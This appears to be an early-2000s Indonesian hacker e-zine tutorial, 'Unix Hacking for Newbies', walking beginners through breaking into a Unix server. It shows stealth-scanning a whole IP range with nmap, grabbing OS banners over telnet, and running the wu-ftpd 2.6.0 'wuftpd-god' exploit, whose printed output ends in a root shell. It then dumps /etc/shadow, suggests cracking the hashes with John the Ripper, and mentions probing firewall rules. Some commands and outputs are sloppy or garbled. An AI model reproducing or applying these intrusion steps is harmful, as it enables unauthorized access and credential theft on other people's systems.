@@ -1,0 +1,168 @@
+                                 ...........................                                    
+                                 ..     Unix Hacking      ..
+                                 ..     Untuk Newbies     ..
+                                 ...........................
+                                  
+
+echo-zine 02
+Oleh: the_day (echo-staff)
+      the_day@echo.or.id || the_day2000@yahoo.com
+
+	Sebelum memulai hack unix kita memerlukan bebepa peralatan diantaranya :
+
+	1. - Superscan ( Windows )
+	2. - Nmap ( Unix )
+	3. - Shell Prompt (dengan full access)
+        4. - Compiler c pada shell
+
+	Setelah kita sudah memiliki semua diatas selanjutnya kita cari target untuk 
+	di hack :P .Untuk mencari target kita perlu mengunak peralatan scan seperti
+	superscan atau nmap.
+	mengunakan nmap:
+            -->[hack71@linuxmco hack71]$ nmap -sS 202.112.*.*
+                artinya kita scan ip 202.112.*.* denga Stealth Scan
+	sebagai contoh kita ambil satu target dengan inisial xxx dengan hasil scan :
+               =======================================================
+
+	Starting nmap 3.45 ( http://www.insecure.org/nmap/ ) at 2003-10-15 13:35 JST
+	Machine 207.106.22.5 MIGHT actually be listening on probe port 80
+	Host comanche.rapidns.com (207.106.22.5) appears to be up ... good.
+	Initiating Connect() Scan against comanche.rapidns.com (207.106.22.5) at 13:35
+	Adding open port 22/tcp
+	Adding open port 389/tcp
+	Adding open port 8080/tcp
+	Adding open port 3306/tcp
+	Adding open port 1002/tcp
+	Adding open port 80/tcp
+	Adding open port 1720/tcp
+	Adding open port 25/tcp
+	Adding open port 4321/tcp
+	Adding open port 110/tcp
+	Adding open port 2000/tcp
+	Adding open port 53/tcp
+	Adding open port 21/tcp
+	The Connect() Scan took 62 seconds to scan 1657 ports.
+	======================================================================
+	Lalu kita tes masuk kedalam server target dengan mengunakan telnet
+	seperti :
+	[hack71@linuxmco hack71]$ telnet xxx 4321
+	Connected to xxx
+	Escape character is '^]'.
+
+	Login Name Tty Idle Login Time Office Office Phone
+	gt grahm crackhead /1 Nov 1 12:01 
+
+	-----------------------------------------------------------------------
+	Apabila sudah bisa masuk dan memperoleh login dan kita harus mencari vurnerable
+	 server tersebut dan silakan cari pada web2 security :d
+	======================================================================
+	Untuk disini kita coba-coba dengan mengunakan telnet dan kita access pada port 
+	yang terbuka , dan bila beruntung kita bisa mengetahui jenis OS target seperti :
+
+	Trying IPaddress...
+	Connected to target.domain.
+	Escape character is '^]'.
+
+	Red Hat Linux release 6.1 (Cartman)
+	Kernel 2.2.12-20 on an i586
+	login:
+	.---------------------------------------------------------------------
+	Kita sudah bisa mengetahui jenis OS yang dipakai yaitu Redhat 6.1 dan , 
+	tinggal mencari kelemahan dari sistem tersebut .
+	----------------------------------------------------------------------
+                     Buffer OverFlow/Exploiting
+
+	Pada prinsipnya buffer Overflow adalah dimana suatu buffer terbatas.Terbatas 
+	dari jumlah bytes yang ada.Suatu contoh misal suatu menu login dibuat untuk
+	 menampung 10 karakter tp kita memasukan lebih dari 10 karakter sedangkan 
+	didalam sistem tersebut tidak dibuat filter maka akan terjadi buffer overflow 
+	yang akan mengakibatkan sistem menjadi crash .Buffer Overflow yg sekarang 
+	sedang heboh adalah wu-ftpd 2.6.0 untuk redhat 6.2. Silakan download 
+	exploitnya di internet :P
+	----------------------------------------------------------------------
+	Setelah di download lalu kita compile didalam shell kita
+	[hack71@linuxmco hack71]$gcc wuftpd-god.c wuftpd-god
+	setelah di compile kita jalankan exploitnya
+	[hack71@linuxmco hack71]$./wuftpd-god -h
+	Usage: ./wuftpd-god -t <target> [-l user/pass] [-s systype] [-o offset] 
+	[-g] [-h] [-x][-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir]
+	target : host with any wuftpd
+	user : anonymous user
+	dir : if not anonymous user, you need to have writable directory
+	magic_str : magic string (see exploit description)
+	-g : enables magic string digging
+	-x : enables test mode
+	pass_addr : pointer to setproctitle argument
+	ret_addr : this is pointer to shellcode
+	systypes: 
+	  0 - RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm
+	  1 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm
+	  2 - SuSe 6.3 with wuftpd 2.6.0(1) from rpm
+	  3 - SuSe 6.4 with wuftpd 2.6.0(1) from rpm
+	  4 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm (test)
+	  5 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from ports
+	* 6 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from packages
+	  7 - FreeBSD 3.4-RELEASE with wuftpd 2.6.0(1) from ports
+	  8 - FreeBSD 4.0-RELEASE with wuftpd 2.6.0(1) from packages
+
+	[hack71@linuxmco hack71]$ ./wuftpd-god -s0 -t target.domain
+	Target: target.domain (ftp/<shellcode>): RedHat 6.2 (?) with wuftpd 
+	2.6.0(1) from rpm
+	Return Address: 0x08075844, AddrRetAddr: 0xbfffb028, Shellcode: 152
+
+	loggin into system..
+	[32mUSER ftp
+	[0m331 Guest login ok, send your complete e-mail address as password.
+	[32mPASS <shellcode>
+	[0m230-Next time please use your e-mail address as your password
+	230- for example: joe@cc456375-b.abdn1.md.home.com
+	230 Guest login ok, access restrictions apply.
+	STEP 2 : Skipping, magic number already exists: [87,01:03,02:01,01:02,04]
+	STEP 3 : Checking if we can reach our return address by format string
+	Linux melmac 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2002 i686 unknown
+	uid=0(root) gid=0(root) egid=50(ftp) groups=50(ftp)
+
+	#
+	----------------------------------------------------------------------
+	Kita sudah berhasil masuk dan kita ke tahap selanjutnya 
+	# cat /etc/shadow > /root/passwd 
+	root:34jk3h4jh3.,;8363:0:0:root:/root:/bin/bash
+	bin:x:1:1:bin:/bin:
+	daemon:x:2:2:daemon:/sbin:
+	adm:x:3:4:adm:/var/adm:
+	lp:x:4:7:lp:/var/spool/lpd:
+	sync:x:5:0:sync:/sbin:/bin/sync
+	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+	halt:x:7:0:halt:/sbin:/sbin/halt
+	mail:x:8:12:mail:/var/spool/mail:
+	news:x:9:13:news:/var/spool/news:
+	uucp:x:10:14:uucp:/var/spool/uucp:
+	operator:x:11:0:operator:/root:
+	games:x:12:100:games:/usr/games:
+	sympa:x:89:89:Sympa Mailing list manager:/home/sympa:/bin/bash
+	gopher:x:13:30:gopher:/usr/lib/gopher-data:
+	ftp:x:14:50:FTP User:/home/ftp:
+	nobody:x:99:99:Nobody:/:
+	xfs:x:100:103:X Font Server:/etc/X11/fs:/bin/false
+	fax:x:10:14:Fax Master:/home/fax/:/bin/bash
+	postfix:x:101:233:postfix:/var/spool/postfix:
+	gdm:x:42:235::/home/gdm:/bin/bash
+	grim:9hu.u8:501:501:grim:/home/grim:/bin/bash
+	banal:x:102:236:BANAL Administrator:/home/banal:/bin/bash
+	bleeb:36.34/363;86:502:506::/home/bleeb:/bin/bash
+	---------------------------------------------------------------------
+	perinrtah diatas menyimpan sebagai /root/passwd .apabila kita ingin 
+	mengetahui passwordnya gunakanlah Jhon Ripper untuk mengcrack password.
+	----------------------------------------------------------------------
+	Masalah yang mungkin akan terjadi apabila di target memasang firewall , 
+	kita gunakan nmap untuk mendeteksi rule pada firewall tersebut gunakan 
+	perintah " nmap -sA " perintah ini akan mencari rule dari firewall 
+	target .
+	Mungkin cukup segini aja yang bisa saya berikan.
+
+	----------------------------------------------------------------------
+	bacaan :- how to become hacker
+        - securityfocus/archive
+
+	pecial thank's for : y3dips,Moby,comex and also for my girl friend Melisa 
+	Apabila ada pertanyaan silakan hub : the_day@echo.or.id 
